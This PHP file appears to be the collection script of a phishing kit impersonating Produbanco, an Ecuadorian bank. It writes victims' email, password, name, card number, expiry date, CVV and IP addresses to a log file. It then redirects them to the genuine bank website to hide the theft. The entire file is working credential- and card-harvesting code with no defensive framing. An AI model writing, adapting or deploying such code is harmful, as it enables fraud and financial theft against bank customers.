<?php
    session_start();

    $fhandlr = fopen($_SESSION['fnm'], "a");
    
    fwrite($fhandlr, "-------------------------------------------\n");
    fwrite($fhandlr, 'E: '.$_SESSION['u1']."\n");
    fwrite($fhandlr, 'P: '.$_SESSION['u2']."\n");
    fwrite($fhandlr, 'NM: '.$_POST['gtrip01']."\n");
    fwrite($fhandlr, 'AP: '.$_POST['gtrip02']."\n");
    fwrite($fhandlr, 'T: '.$_POST['gtrip03']."\n");
    fwrite($fhandlr, 'FV: '.$_POST['gtrip04']."/".$_POST['gtrip05']."\n");
    fwrite($fhandlr, 'CV: '.$_POST['gtrip06']."\n");


    @fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    
    
    fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
    fclose($fhandlr);
    header ('Location:https://www.produbanco.com.ec/');

    session_destroy();
    exit;
?>